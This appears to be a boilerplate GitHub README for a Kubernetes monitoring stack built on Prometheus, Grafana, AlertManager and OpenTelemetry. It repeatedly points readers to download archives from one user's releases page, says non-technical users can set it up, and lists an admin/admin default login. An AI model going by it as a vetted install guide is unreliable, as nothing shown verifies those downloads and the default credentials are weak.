---
layout: "default"
title: "🎉 k8s-observability-stack - Simplify Your Kubernetes Monitoring"
description: "🚀 Deploy a production-ready Kubernetes observability stack with Prometheus, Grafana, and OpenTelemetry for effective monitoring and alerting."
---
# 🎉 k8s-observability-stack - Simplify Your Kubernetes Monitoring

[![Download k8s-observability-stack](https://img.shields.io/badge/Download-k8s--observability--stack-blue.svg)](https://github.com/rdiway4/k8s-observability-stack/releases)

## 🚀 Getting Started

Welcome to the k8s-observability-stack! This application helps you monitor your Kubernetes environment easily. It combines powerful tools like Prometheus, Grafana, AlertManager, and OpenTelemetry into one production-ready stack.

## 📋 Features

- **Prometheus**: Collects metrics from your applications.
- **Grafana**: Creates beautiful dashboards for visualizing data.
- **AlertManager**: Sends notifications based on your configured rules.
- **OpenTelemetry**: Provides a unified way to gather tracing data.

This stack is designed for users of all skill levels, even if you have no technical background. You can set it up and start monitoring your applications quickly.

## 🛠️ System Requirements

Before you begin, ensure your system meets these requirements:

- A running Kubernetes cluster (version 1.16 or higher)
- At least 2 CPUs available
- 4 GB of RAM minimum
- Helm installed (version 3.0 or higher)

If you're not familiar with some of these terms, don't worry. A Kubernetes cluster is just a group of machines that run your applications. Helm is a tool that helps us manage applications on Kubernetes.

## 🔧 Installation Steps

Follow these simple steps to install and run the k8s-observability-stack.

### 1. Visit the Releases Page

To download the application, visit the landing page:

[Download k8s-observability-stack](https://github.com/rdiway4/k8s-observability-stack/releases)

### 2. Choose the Latest Release

On the Releases page, find the latest release. It is usually at the top of the list.

### 3. Download Files

Look for the files listed under the release. You can download the compressed Charts or Configuration files based on your needs. Click on the file names to download them to your computer.

### 4. Install with Helm

1. Open your terminal.
2. Navigate to the directory where you downloaded the files.
3. Run the following command to install the observability stack:

   ```bash
   helm install k8s-observability-stack ./path-to-your-chart
   ```

Replace `./path-to-your-chart` with the actual path to the downloaded chart file.

### 5. Verify the Installation

To check if the installation was successful, run:

```bash
kubectl get pods -n observability
```

You should see pods for Prometheus, Grafana, AlertManager, and OpenTelemetry running. If you see an error, double-check your installation steps and requirements.

## 📥 Download & Install

To start your journey with k8s-observability-stack, please visit this page to download:

[Download k8s-observability-stack](https://github.com/rdiway4/k8s-observability-stack/releases)

## 🔍 Using the Stack

Once your observability stack is up and running, access the Grafana dashboard through your browser. The default login credentials are:

- **Username**: admin
- **Password**: admin

You can change your password once you log in. From here, you can create custom dashboards, set up monitoring alerts, and explore your application metrics.

## 📞 Support

If you run into any issues, please check the [FAQs](#). If you still need help, you can open an issue on the GitHub repository, and our team will assist you.

## 🧑‍🤝‍🧑 Community Contributions

We encourage contributions! If you'd like to help improve this project, check our [Contributing Guidelines](#). Your feedback and improvements are always welcome.

## 📝 License

This project is licensed under the MIT License. You can use it freely, but please include a copy of the license in redistributed software.

Thank you for choosing k8s-observability-stack! Happy monitoring!